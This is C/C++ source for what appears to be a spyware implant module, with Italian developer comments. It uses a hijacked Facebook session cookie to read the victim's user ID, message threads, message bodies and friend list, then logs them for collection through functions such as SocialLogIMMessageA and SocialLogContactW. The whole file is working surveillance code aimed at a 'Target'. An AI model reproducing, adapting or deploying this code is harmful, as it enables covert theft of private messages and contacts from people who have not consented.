#include <Windows.h>
#include <stdio.h>
#include <time.h>

#include "debug.h"
#include "zmem.h"
#include "utils.h"
#include "social.h"
#include "facebook.h"
#include "JSON.h"
#include "conf.h"

LPSTR FacebookGetUserId(LPSTR strBuffer)
{
	LPSTR strParser = strstr(strBuffer, FB_USER_ID);
	if (!strParser)
		return NULL;

	strParser += strlen(FB_USER_ID);
	if (strchr(strParser, '"'))
		*(strchr(strParser, '"')) = 0;
	else
		return NULL;

	return strParser;
}

LPSTR FacebookGetScreenName(LPSTR strBuffer, LPSTR strUserId)
{
	CHAR strScreenNameTag[256] = { 0x0 };

	_snprintf_s(strScreenNameTag, 255, _TRUNCATE, FB_MESSAGE_SCREEN_NAME_ID, strUserId);
	LPSTR strParser = strstr(strBuffer, strScreenNameTag);
	if (!strParser)
		return NULL;

	strParser += strlen(strScreenNameTag);
	if (strchr(strParser, '"'))
		*(strchr(strParser, '"')) = 0;
	else
		return NULL;

	if (strlen(strParser))
		return strParser;
	else 
		return "Target";
}

BOOL FacebookGetUserInfo(LPSTR strCookie, LPSTR *strUserId, LPSTR *strScreenName)
{
	LPSTR strRecvBuffer, strParser;
	DWORD dwRet, dwBufferSize;

	*strUserId = *strScreenName = NULL;

	dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie); // FIXME array
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return FALSE;

	// search for user id
	*strUserId = FacebookGetUserId(strRecvBuffer);
	if (!*strUserId || !strcmp(*strUserId, "0"))
	{
		zfree(strRecvBuffer);
		return FALSE;
	}

	// search for screen name
	strParser = *strUserId + strlen(*strUserId) + 1;
	*strScreenName = FacebookGetScreenName(strParser, *strUserId);

	// we're done with this request, copy buffers and frees it
	*strUserId = _strdup(*strUserId);
	*strScreenName = _strdup(*strScreenName);

	zfree(strRecvBuffer);
	return TRUE;
}

BOOL FacebookParseThreads(LPSTR strCookie, LPSTR strUserId, LPSTR strScreenName, DWORD dwLastTS)
{
	BOOL bIncoming;
	WCHAR strUrl[256];
	CHAR strThreadId[512];
	CHAR strPeersId[256];
	CHAR strPeers[512];
	CHAR strAuthor[256];
	CHAR strAuthorId[256];
	DWORD dwRet, dwBufferSize;
	LPSTR strRecvBuffer, strRecvBuffer2, strParser1, strParser2, strInnerParser1, strInnerParser2;


	LPSTR strMsgBody = NULL;

	dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", L"/messages/", 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBufferSize, strCookie);  //FIXME: array
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return FALSE;
	
	strParser1 = strstr(strRecvBuffer, FB_THREAD_LIST_END);
	if (!strParser1)
	{
		zfree(strRecvBuffer);
		return NULL;
	}
	*strParser1 = 0; // fine lista
	

	strParser1 = strstr(strRecvBuffer, FB_THREAD_LIST_ID);
	if (!strParser1)
	{
		zfree(strRecvBuffer);
		return FALSE;
	}	

	for (;;)
	{
		// get thread status and skip if unread
		strParser2 = strstr(strParser1, FB_THREAD_STATUS_IDENTIFIER_V2);
		if (strParser2) 
		{
			strParser2 += strlen(FB_THREAD_STATUS_IDENTIFIER_V2);
			if (*strParser2 != '0') // unread
			{
				strParser1 = strParser2;
				continue;
			}
		}
		else 
			break;

		strParser1 = strstr(strParser1, FB_THREAD_IDENTIFIER_V2);
		if (!strParser1)
			break;
		
		strParser1 += strlen(FB_THREAD_IDENTIFIER_V2);
		strParser2 = strchr(strParser1, '"');
		if (!strParser2)
			break;
		*strParser2 = 0;


		SecureZeroMemory(strUrl, 256);
		SecureZeroMemory(strThreadId, 512);
		strcpy_s(strThreadId, 512, strParser1);
		URLDecode(strThreadId);
		_snwprintf_s(strUrl, sizeof(strUrl)/sizeof(WCHAR), _TRUNCATE, L"/ajax/messaging/async.php?sk=inbox&action=read&tid=%S&__a=1&msgs_only=1", strThreadId);  //FIXME: array

		
		strParser1 = strParser2 + 1;
		
		// cerca id partecipanti
		BOOL bAmIPresent = FALSE;
		SecureZeroMemory(strPeersId, sizeof(strPeersId));
		for (;;)
		{
			strParser2 = strstr(strParser1, FB_PEER_ID_IDENTIFIER);
			if (!strParser2)
				break;
			strParser1 = strParser2 + strlen(FB_PEER_ID_IDENTIFIER);
			strParser2 = strchr(strParser1, '"');
			if (!strParser2)
				break;
			*strParser2 = 0;

			if (!strcmp(strParser1, strUserId))
				bAmIPresent = TRUE;

			if (strlen(strPeersId) == 0)
				_snprintf_s(strPeersId, sizeof(strPeersId), _TRUNCATE, "%s", strParser1);
			else
				_snprintf_s(strPeersId, sizeof(strPeersId), _TRUNCATE, "%s,%s", strPeersId, strParser1);

			strParser1 = strParser2 + 1;

			if (*strParser1 == ']')
				break;
		}
		if (!bAmIPresent)
			_snprintf_s(strPeersId, sizeof(strPeersId), _TRUNCATE, "%s,%s", strPeersId, strUserId);

		// controlla timestamp
		strParser1 = strstr(strParser1, FB_MESSAGE_TSTAMP_IDENTIFIER_V2);
		if (!strParser1)
			break;
		strParser1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER_V2);

		DWORD dwCurrTS;
		CHAR strTimeStamp[11];
		SecureZeroMemory(strTimeStamp, sizeof(strTimeStamp));
		memcpy(strTimeStamp, strParser1, 10);
		dwCurrTS = atoi(strTimeStamp);
		if (dwCurrTS > 2000000000 || dwCurrTS <= dwLastTS)
			continue;

		// salva timestamp se piu' recente
		SocialSetLastTimestamp(strUserId, dwCurrTS, 0);

		// get thread's messages
		DWORD dwBuffSize2;
		dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer2, &dwBuffSize2, strCookie);  //FIXME: array
		if (dwRet != SOCIAL_REQUEST_SUCCESS)
		{
			zfree(strRecvBuffer);
			return FALSE;
		}

		// get peers screen name, 
		strInnerParser1 = strRecvBuffer2;
		strInnerParser1 = strstr(strInnerParser1, FB_THREAD_AUTHOR_IDENTIFIER_V2);
		if (!strInnerParser1)
		{
			zfree(strRecvBuffer2);
			continue;
		}

		strInnerParser1 += strlen(FB_THREAD_AUTHOR_IDENTIFIER_V2);
		strInnerParser2 = strstr(strInnerParser1, " - ");
		if (!strInnerParser2)
		{
			zfree(strRecvBuffer2);
			continue;
		}
		*strInnerParser2 = 0;
		_snprintf_s(strPeers, sizeof(strPeers), _TRUNCATE, "%s, %s", strScreenName, strInnerParser1);

		strInnerParser1 = strRecvBuffer2;
		for (;;)
		{
			strInnerParser1 = strstr(strInnerParser1, FB_MESSAGE_TSTAMP_IDENTIFIER);
			if (!strInnerParser1)
				break;
			strInnerParser1 += strlen(FB_MESSAGE_TSTAMP_IDENTIFIER);
			SecureZeroMemory(strTimeStamp, sizeof(strTimeStamp));
			memcpy(strTimeStamp, strInnerParser1, 10);
			dwCurrTS = atoi(strTimeStamp);
			if (dwCurrTS > 2000000000 || dwCurrTS <= dwLastTS)
				continue;
			SocialSetLastTimestamp(strUserId, dwCurrTS, 0);

			strInnerParser2 = strstr(strInnerParser1, FB_MESSAGE_AUTHOR_IDENTIFIER);
			if (!strInnerParser2)
				break;
			*strInnerParser2 = 0;
			strInnerParser1 = strInnerParser2;
			for (;*(strInnerParser1) != '>' && strInnerParser1 > strRecvBuffer2; strInnerParser1--);
			if (strInnerParser1 <= strRecvBuffer2)
				break;
			strInnerParser1++;
			_snprintf_s(strAuthor, sizeof(strAuthor), _TRUNCATE, "%s", strInnerParser1);
			strInnerParser1--;

			for (;*(strInnerParser1) != '\\' && strInnerParser1 > strRecvBuffer2; strInnerParser1--);
			if (strInnerParser1 <= strRecvBuffer2)
				break;
			*strInnerParser1 = 0;
			for (;*(strInnerParser1) != '=' && strInnerParser1 > strRecvBuffer2; strInnerParser1--);
			if (strInnerParser1 <= strRecvBuffer2)
				break;
			strInnerParser1++;
			_snprintf_s(strAuthorId, sizeof(strAuthorId), _TRUNCATE, "%s", strInnerParser1);
			strInnerParser1 = strInnerParser2 + 1;

			if (!strcmp(strAuthorId, strUserId))
				bIncoming = FALSE;
			else
				bIncoming = TRUE;

			DWORD dwMsgPartSize, dwMsgBodySize;
			dwMsgPartSize = dwMsgBodySize = 0;
			zfree(strMsgBody); // questo e' NULL al primo giro, zfree se lo smazza.
			for (;;)
			{
				LPSTR strMsgParser1, strMsgParser2;
				strMsgParser1 = strstr(strInnerParser1, FB_MESSAGE_BODY_IDENTIFIER);
				if (!strMsgParser1)
					break;
				// no moar body, parte un altro timestamp
				strMsgParser2 = strstr(strInnerParser1, FB_MESSAGE_TSTAMP_IDENTIFIER);
				if (strMsgParser2 && strMsgParser2<strMsgParser1)
					break;

				strInnerParser1 = strMsgParser1;
				strInnerParser1 = strstr(strInnerParser1, "p>");  //FIXME: array
				if (!strInnerParser1)
					break;
				strInnerParser1 += strlen("p>");
				strInnerParser2 = strstr(strInnerParser1, "\\u003C\\/p>");  //FIXME: array
				if (!strInnerParser2)
					break;
				*strInnerParser2 = 0;

				DWORD dwMsgPartSize = strlen(strInnerParser1);
				strMsgParser1 = (LPSTR) realloc(strMsgBody, dwMsgBodySize + dwMsgPartSize + strlen(FB_NEW_LINE) + sizeof(WCHAR));
				if (!strMsgParser1)
					break;

				// se non e' il primo body, mette a capo
				if (strMsgBody)
				{
					memcpy(strMsgParser1 + dwMsgBodySize, FB_NEW_LINE, strlen(FB_NEW_LINE));
					dwMsgBodySize += strlen(FB_NEW_LINE);				
				}

				strMsgBody = strMsgParser1;
				memcpy(strMsgBody + dwMsgBodySize, strInnerParser1, dwMsgPartSize);
				dwMsgBodySize += dwMsgPartSize;

				memset(strMsgBody + dwMsgBodySize, 0x0, sizeof(WCHAR));

				strInnerParser1 = strInnerParser2 + 1;
			}

			if (strMsgBody)
			{
				struct tm tstamp;
				_gmtime32_s(&tstamp, (__time32_t *)&dwCurrTS);
				tstamp.tm_year += 1900;
				tstamp.tm_mon++;

				JsonDecode(strMsgBody);
				
				SocialLogIMMessageA(CHAT_PROGRAM_FACEBOOK, strPeers, strPeersId, strAuthor, strAuthorId, strMsgBody, &tstamp, bIncoming);

				zfree(strMsgBody);
				strMsgBody = NULL;
			}
			else
				break;
		}
		zfree(strRecvBuffer2);
	}

	zfree(strRecvBuffer);
	return TRUE;
}

DWORD FacebookMessageHandler(LPSTR strCookie)
{
	DWORD dwLastTimeStamp;
	LPSTR strUserId, strScreenName;
	
	if (!ConfIsModuleEnabled(L"messages"))
		return SOCIAL_REQUEST_SUCCESS;

	// get user id and screen name
	if (!FacebookGetUserInfo(strCookie, &strUserId, &strScreenName))
		return SOCIAL_REQUEST_BAD_COOKIE;

	// get last timestamp
	dwLastTimeStamp = SocialGetLastTimestamp(strUserId, NULL);
	if (dwLastTimeStamp == SOCIAL_INVALID_TSTAMP)
		return SOCIAL_REQUEST_BAD_COOKIE;

	if (!FacebookParseThreads(strCookie, strUserId, strScreenName, dwLastTimeStamp))
	{
		zfree(strUserId);
		zfree(strScreenName);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	
	zfree(strUserId);
	zfree(strScreenName);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD FacebookContactHandler(LPSTR strCookie)
{
	LPSTR strUserId, strScreenName;

	if (!ConfIsModuleEnabled(L"addressbook"))
		return SOCIAL_REQUEST_SUCCESS;

	// get user id and screen name
	if (!FacebookGetUserInfo(strCookie, &strUserId, &strScreenName))
		return SOCIAL_REQUEST_BAD_COOKIE;

	LPWSTR strUrl = (LPWSTR) zalloc(2048*sizeof(WCHAR));
	_snwprintf_s(strUrl, 2048, _TRUNCATE, L"/ajax/typeahead/first_degree.php?__a=1&viewer=%S&token=v7&filter[0]=user&options[0]=friends_only&__user=%S", strUserId, strUserId); //FIXME array

	LPSTR strRecvBuffer;
	DWORD dwBuffSize;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie); // FIXME: array
	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		zfree(strUrl);
		return SOCIAL_REQUEST_NETWORK_PROBLEM;
	}

	LPSTR strJson = strRecvBuffer;
	while (*strJson != '{' && (strJson - strRecvBuffer) < dwBuffSize)
		strJson++;

	JSONValue *jValue = JSON::Parse(strJson);
	if (jValue != NULL && jValue->IsObject())
	{
		JSONObject jRoot = jValue->AsObject();
		if (jRoot.find(L"payload") != jRoot.end()) //FIXME: array
		{
			if (jRoot[L"payload"]->IsObject())
			{
				JSONObject jPayload = jRoot[L"payload"]->AsObject();
				if (jPayload.find(L"entries") != jPayload.end() && jPayload[L"entries"]->IsArray())  //FIXME: array
				{
					JSONArray jEntries = jPayload[L"entries"]->AsArray();  //FIXME: array
					for (DWORD i=0; i<jEntries.size(); i++)
					{
						LPWSTR strUID = NULL;
						LPWSTR strName = NULL; 
						LPWSTR strProfile = NULL;

						if (!jEntries.at(i)->IsObject())
							continue;

						JSONObject jEntry = jEntries.at(i)->AsObject();
						if (jEntry.find(L"uid") != jEntry.end() && jEntry[L"uid"]->IsNumber())  //FIXME: array
						{							
							strUID = (LPWSTR) zalloc(1024*sizeof(WCHAR));
							_snwprintf_s(strUID, 1023, _TRUNCATE, L"%.0lf", jEntry[L"uid"]->AsNumber());  //FIXME: array
						}
						if (jEntry.find(L"text") != jEntry.end() && jEntry[L"text"]->IsString())  //FIXME: array
						{
							strName = (LPWSTR) zalloc(1024*sizeof(WCHAR)); 
							memcpy(strName, jEntry[L"text"]->AsString().c_str(), min(jEntry[L"text"]->AsString().size()*sizeof(WCHAR), 1024*sizeof(WCHAR)));  //FIXME: array
						}
						if (jEntry.find(L"path") != jEntry.end() && jEntry[L"path"]->IsString())  //FIXME: array
						{
							strProfile = (LPWSTR) zalloc(1024*sizeof(WCHAR));
							memcpy(strProfile, jEntry[L"path"]->AsString().c_str(), min(jEntry[L"path"]->AsString().size()*sizeof(WCHAR), 1024*sizeof(WCHAR)));  //FIXME: array
						}

						if (strUID && strName && strProfile)
						{
							LPSTR strTmp = (LPSTR) zalloc(1024);
							_snprintf_s(strTmp, 1024, _TRUNCATE, "%S", strUID);

							DWORD dwFlags = 0;
							if (!strncmp(strTmp, strUserId, strlen(strUserId)))
								dwFlags = CONTACTS_MYACCOUNT;
							
							SocialLogContactW(CONTACT_SRC_FACEBOOK, strName, NULL, NULL, NULL, NULL, NULL, NULL, NULL, strUID, strProfile, dwFlags);
							zfree(strTmp);
						}

						zfree(strName);
						zfree(strProfile);
						zfree(strUID);
					}
				}
			}
		}
	}

	if (jValue)
		delete jValue;

	return SOCIAL_REQUEST_BAD_COOKIE;
}